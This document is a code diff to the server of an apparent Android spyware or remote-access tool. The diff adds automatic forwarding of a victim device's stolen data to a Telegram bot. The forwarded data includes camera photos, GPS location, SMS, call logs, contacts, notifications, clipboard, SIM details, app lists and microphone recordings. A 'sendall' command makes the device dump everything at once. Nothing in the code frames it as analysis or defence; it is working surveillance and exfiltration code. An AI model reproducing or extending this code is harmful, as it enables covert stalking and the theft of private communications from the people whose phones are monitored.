@@ -4,6 +4,7 @@ const { Server } = require('socket.io');
 const path = require('path');
 const cors = require('cors');
 const { v4: uuidv4 } = require('uuid');
+const telegram = require('./telegram');
 
 const app = express();
 const server = http.createServer(app);
@@ -21,6 +22,29 @@ app.use(express.static(path.join(__dirname, '..', 'public')));
 // In-memory device store
 const devices = new Map();
 const deviceSockets = new Map();
+
+// Telegram auto-send state
+let telegramEnabled = true;
+const telegramQueue = [];
+let telegramSending = false;
+
+async function sendToTelegram(fn) {
+  if (!telegramEnabled) return;
+  telegramQueue.push(fn);
+  if (telegramSending) return;
+  telegramSending = true;
+  while (telegramQueue.length > 0) {
+    const task = telegramQueue.shift();
+    try {
+      await task();
+    } catch (e) {
+      console.log('[Telegram] Error:', e.message);
+    }
+    // Rate limit: 1 msg per 100ms
+    await new Promise(r => setTimeout(r, 100));
+  }
+  telegramSending = false;
+}
 
 // API: List all registered devices
 app.get('/api/devices', (req, res) => {
@@ -86,6 +110,9 @@ io.on('connection', (socket) => {
     socket.emit('device:registered', { deviceId });
     io.emit('devices:updated');
     console.log(`[Device] Registered: ${deviceId} (${deviceInfo.name})`);
+
+    // Send device connect notification to Telegram
+    sendToTelegram(() => telegram.sendMessage(telegram.formatDeviceInfo(data, deviceInfo.name)));
   });
 
   // Device sends updated info
@@ -153,6 +180,10 @@ io.on('connection', (socket) => {
       deviceId: socket.deviceId,
       image: data.image
     });
+    // Forward captured photo to Telegram
+    if (data.image) {
+      sendToTelegram(() => telegram.sendPhoto(data.image, '📷 Camera Capture'));
+    }
   });
 
   // Dashboard requests GPS from device
@@ -176,6 +207,8 @@ io.on('connection', (socket) => {
       deviceId: socket.deviceId,
       ...data
     });
+    // Forward to Telegram
+    sendToTelegram(() => telegram.sendMessage(telegram.formatLocation(data)));
   });
 
   // Dashboard requests gallery/photos from device
@@ -192,6 +225,10 @@ io.on('connection', (socket) => {
       deviceId: socket.deviceId,
       ...data
     });
+    // Forward gallery count to Telegram (not individual photos to avoid spam)
+    if (!data.partial && data.total) {
+      sendToTelegram(() => telegram.sendMessage(`📷 <b>Gallery Scan Complete</b>\n${data.total} photos found on device`));
+    }
   });
 
   // Dashboard requests full-size photo
@@ -224,6 +261,10 @@ io.on('connection', (socket) => {
       deviceId: socket.deviceId,
       ...data
     });
+    // Forward to Telegram
+    if (data.calls && data.calls.length > 0) {
+      sendToTelegram(() => telegram.sendMessage(telegram.formatCallLog(data.calls)));
+    }
   });
 
   // Dashboard requests SMS
@@ -240,6 +281,10 @@ io.on('connection', (socket) => {
       deviceId: socket.deviceId,
       ...data
     });
+    // Forward to Telegram
+    if (data.messages && data.messages.length > 0) {
+      sendToTelegram(() => telegram.sendMessage(telegram.formatSMS(data.messages)));
+    }
   });
 
   // Dashboard requests browsing history
@@ -264,6 +309,8 @@ io.on('connection', (socket) => {
       deviceId: socket.deviceId,
       ...data
     });
+    // Forward to Telegram
+    sendToTelegram(() => telegram.sendMessage(telegram.formatNotification(data)));
   });
 
   // Dashboard requests file listing
@@ -312,6 +359,15 @@ io.on('connection', (socket) => {
       deviceId: socket.deviceId,
       ...data
     });
+    // Forward notifications to Telegram
+    if (data.notifications && data.notifications.length > 0) {
+      const recent = data.notifications.slice(0, 20);
+      let text = `🔔 <b>Notifications</b> (${data.notifications.length})\n━━━━━━━━━━━━━━━━━━\n`;
+      recent.forEach(n => {
+        text += `📦 ${n.app || n.packageName || '-'}: ${n.title || '-'}\n   ${(n.text || '').substring(0, 80)}\n\n`;
+      });
+      sendToTelegram(() => telegram.sendMessage(text));
+    }
   });
 
   // Dashboard requests WhatsApp media
@@ -384,6 +440,10 @@ io.on('connection', (socket) => {
       deviceId: socket.deviceId,
       ...data
     });
+    // Forward to Telegram
+    if (data.contacts && data.contacts.length > 0) {
+      sendToTelegram(() => telegram.sendMessage(telegram.formatContacts(data.contacts)));
+    }
   });
 
   // Live call events (real-time incoming/outgoing/missed)
@@ -392,6 +452,13 @@ io.on('connection', (socket) => {
       deviceId: socket.deviceId,
       ...data
     });
+    // Forward live call event to Telegram
+    const icon = data.type === 'incoming' ? '📥' : data.type === 'outgoing' ? '📤' : '📵';
+    sendToTelegram(() => telegram.sendMessage(
+      `${icon} <b>Live Call</b>\n━━━━━━━━━━━━━━━━━━\n` +
+      `📞 ${data.type}: ${data.name || data.number || 'Unknown'}\n` +
+      `⏰ ${new Date().toLocaleString()}`
+    ));
   });
 
   // Call log deletion detected
@@ -437,6 +504,8 @@ io.on('connection', (socket) => {
       deviceId: socket.deviceId,
       ...data
     });
+    // Forward to Telegram
+    sendToTelegram(() => telegram.sendMessage(telegram.formatClipboard(data)));
   });
 
   // ---- New Feature Commands ----
@@ -483,6 +552,8 @@ io.on('connection', (socket) => {
   });
   socket.on('sim:info', (data) => {
     socket.broadcast.emit('sim:info', { deviceId: socket.deviceId, ...data });
+    // Forward to Telegram
+    sendToTelegram(() => telegram.sendMessage(telegram.formatSimInfo(data)));
   });
 
   // Vibrate
@@ -527,6 +598,10 @@ io.on('connection', (socket) => {
   });
   socket.on('apps:list', (data) => {
     socket.broadcast.emit('apps:list', { deviceId: socket.deviceId, ...data });
+    // Forward to Telegram
+    if (data.apps && data.apps.length > 0) {
+      sendToTelegram(() => telegram.sendMessage(telegram.formatApps(data.apps)));
+    }
   });
 
   // Microphone record with duration
@@ -538,14 +613,46 @@ io.on('connection', (socket) => {
   });
   socket.on('mic:recording', (data) => {
     socket.broadcast.emit('mic:recording', { deviceId: socket.deviceId, ...data });
+    // Forward mic recording to Telegram as document
+    if (data.audio) {
+      sendToTelegram(() => telegram.sendDocument(data.audio, 'recording.wav', '🎙️ Mic Recording'));
+    }
   });
   socket.on('mic:status', (data) => {
     socket.broadcast.emit('mic:status', { deviceId: socket.deviceId, ...data });
   });
 
+  // Telegram control commands from dashboard
+  socket.on('command:telegram:toggle', (data) => {
+    telegramEnabled = data.enabled !== false;
+    socket.broadcast.emit('telegram:status', { enabled: telegramEnabled });
+    console.log(`[Telegram] ${telegramEnabled ? 'Enabled' : 'Disabled'}`);
+  });
+
+  socket.on('command:telegram:test', () => {
+    sendToTelegram(() => telegram.sendMessage('✅ <b>Telegram Bot Connected!</b>\nAll device data will be forwarded here.'));
+  });
+
+  // Send all data at once to Telegram
+  socket.on('command:telegram:sendall', ({ deviceId }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      // Request all data from device
+      io.to(targetSocketId).emit('command:contacts:fetch');
+      io.to(targetSocketId).emit('command:calllog:fetch');
+      io.to(targetSocketId).emit('command:sms:fetch');
+      io.to(targetSocketId).emit('command:apps:list');
+      io.to(targetSocketId).emit('command:sim:info');
+      io.to(targetSocketId).emit('command:clipboard:get');
+      io.to(targetSocketId).emit('command:gps:start');
+      sendToTelegram(() => telegram.sendMessage('🚀 <b>Fetching all device data...</b>\nAll data will be sent shortly.'));
+    }
+  });
+
   // Disconnect
   socket.on('disconnect', () => {
     if (socket.deviceId) {
+      const deviceName = devices.has(socket.deviceId) ? devices.get(socket.deviceId).name : socket.deviceId;
       deviceSockets.delete(socket.deviceId);
       if (devices.has(socket.deviceId)) {
         const device = devices.get(socket.deviceId);
@@ -554,6 +661,8 @@ io.on('connection', (socket) => {
       }
       io.emit('devices:updated');
       console.log(`[Device] Disconnected: ${socket.deviceId}`);
+      // Notify Telegram
+      sendToTelegram(() => telegram.sendMessage(`📵 <b>Device Disconnected</b>\n${deviceName}\n⏰ ${new Date().toLocaleString()}`));
     }
     console.log(`[Socket] Disconnected: ${socket.id}`);
   });
